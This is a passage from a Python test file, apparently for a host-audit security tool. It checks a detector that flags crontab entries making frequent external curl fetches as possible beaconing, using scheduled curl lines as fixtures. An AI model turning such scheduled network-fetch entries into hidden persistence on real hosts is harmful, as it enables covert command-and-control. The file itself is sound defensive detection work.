    # FP-bait: a curl that runs once a day, not every 30 min -> the frequency gate silences it.
    res = audit_host(_hardened_runner(
        **{"crontab -l": (0, "@daily curl -fsSL https://example.com/report -o /tmp/report\n")}
    ))
    assert not any(f.rule == "harden-host/crontab-beaconing-entry" for f in res.findings)


def test_audit_host_crontab_localhost_curl_silent() -> None:
    # adversarial (#3): a frequent curl that is clearly benign (hits loopback) -> exempted.
    res = audit_host(_hardened_runner(
        **{"crontab -l": (0, "*/5 * * * * curl -sf http://localhost:8080/healthz\n")}
    ))
    assert not any(f.rule == "harden-host/crontab-beaconing-entry" for f in res.findings)


def test_audit_host_crontab_well_known_domain_still_fires() -> None:
    # adversarial (#3) / documented decision: this probe does NOT allowlist "well-known"
    # external domains (package mirrors, etc.) -- a frequent fetch to one still fires, on
    # the theory that an unexplained periodic external fetch is worth a human's confirmation
    # even when the domain looks legitimate. See `is_network_fetch_command`'s docstring.
    res = audit_host(_hardened_runner(
        **{"crontab -l": (0, "*/15 * * * * curl -s https://pypi.org/simple/ -o /dev/null\n")}
    ))
    assert any(f.rule == "harden-host/crontab-beaconing-entry" for f in res.findings)


def test_audit_host_crontab_empty_is_ok_and_silent() -> None:
    res = audit_host(_hardened_runner(**{"crontab -l": (1, "no crontab for deploy\n")}))
    cron = next(p for p in res.probes if p.name == "crontab")
    assert cron.ok is True and cron.data == []
    assert not any(f.rule == "harden-host/crontab-beaconing-entry" for f in res.findings)


def test_audit_host_crontab_unreadable_disclosed_not_silent_pass() -> None:
    # a genuine read failure (permission denied etc.) must be disclosed as not-ok, never
    # silently read as "no crontab" (that would be a failure presenting as success).
    res = audit_host(_hardened_runner(**{"crontab -l": (1, "permission denied\n")}))
    cron = next(p for p in res.probes if p.name == "crontab")
    assert cron.ok is False and cron.reason


def test_real_runner_decodes_non_utf8_without_raising() -> None:
    # #420: text=True with the platform default (cp1252 on Windows) let a
    # UnicodeDecodeError escape the never-raises contract; utf-8 + errors="replace"
    # must turn undecodable bytes into U+FFFD instead.
    import sys

    from agentsec.hostaudit.probes import real_runner

    res = real_runner([sys.executable, "-c", "import sys; sys.stdout.buffer.write(b'\\xff\\xfeok')"])
    assert res is not None
    rc, out = res
    assert rc == 0 and out.endswith("ok") and "�" in out
